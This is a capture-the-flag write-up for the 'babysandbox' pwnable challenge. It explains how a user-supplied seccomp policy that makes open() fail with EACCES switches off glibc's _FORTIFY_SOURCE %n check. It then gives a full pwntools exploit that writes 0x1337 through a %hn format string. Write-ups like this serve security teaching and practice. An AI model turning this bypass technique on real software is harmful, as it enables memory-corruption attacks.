# babysandbox - pwnable challenge

We are given an C++ x86\_64 Linux binary (with no PIE, but with
_FORTIFY_SOURCE mitagations) along with its source code. The program
reads in and installs a seccomp policy from the user, then runs the
following function containing a format string bug:

```c
void vuln() {
    char input[0x100];
    memset(input, 0, sizeof(input));

    __printf_chk(1, "Let's check our mitigation ^_^\n");
    __printf_chk(1, "Protect : %p\n", &target);
    int res = read(0, input, sizeof(input) - 1);
    if (res < 0) {
        __printf_chk(1, "Functionality is broken T_T\n");
        return;
    }
    // We have a dangerous vulnerability here!
    __printf_chk(1, input);

    if (target == 0x1337) {
        __printf_chk(1, "Mitigation failed.. The flag has been exposed T_T\n");
        read_flag();
    }
    else {
        __printf_chk(1, "\nNow we are safe from memory corruption! Thank you ^_^\n");
    }
    return;
}
```

The format string bug is straightforward, but the one issue is that
`_FORTIFY_SOURCE` does not allow respect the `%n` format specifier if the
format string lives in writable memory. The goal of the challenge is to
devise a seccomp policy that disables the `_FORTIFY_SOURCE` mitigation.

Looking at how glibc detects writable memory, we see that it relies on
[opening and reading
`/proc/self/maps`](https://sourceware.org/git/?p=glibc.git;a=blob;f=sysdeps/unix/sysv/linux/readonly-area.c;h=edc68873f6d673b2b973a596a58d7ee4f2abe4cb;hb=HEAD#l34).
We note that this function fails open (i.e. behaves as if the memory is
read-only) if opening `/proc/self/maps` fails with ENOENT or EACCES. We
can arrange for this to happen by providing a seccomp policy which only
allows the `open()` call in `read_flag()` and fails all other `open()`
calls with EACCES. We detect the `read_flag()` call by comparing the
`filename` argument against the pointer to the flag string in the
non-PIE binary.

With the _FORTIFY_SOURCE protection defeated, the format string can be
exploited to trigger the flag printing function.

Full exploit:
```py
#!/usr/bin/env python3
from pwn import *
context.update(arch='amd64', os='linux')
p, u = pack, unpack

# gem install seccomp-tools
policy = b'''
A = sys_number
A == openat ? next : ok
A = args[1]
A == 0x402147 ? ok : next
return ERRNO(13)
ok:
return ALLOW
'''

compiled_policy = subprocess.Popen(['seccomp-tools', 'asm', '-', '-f', 'raw'], stdin=subprocess.PIPE, stdout=subprocess.PIPE).communicate(policy)[0]

payload = b''
payload += p32(len(compiled_policy))
payload += compiled_policy

target = 0x404088

fmt = ''
fmt += '%08x' * 13
fmt += f'%{0x1337-13*8}x'
fmt += '%hn'
fmt = fmt.ljust(64).encode()
fmt += p(target)

payload += fmt

open('payload', 'wb').write(payload)
```
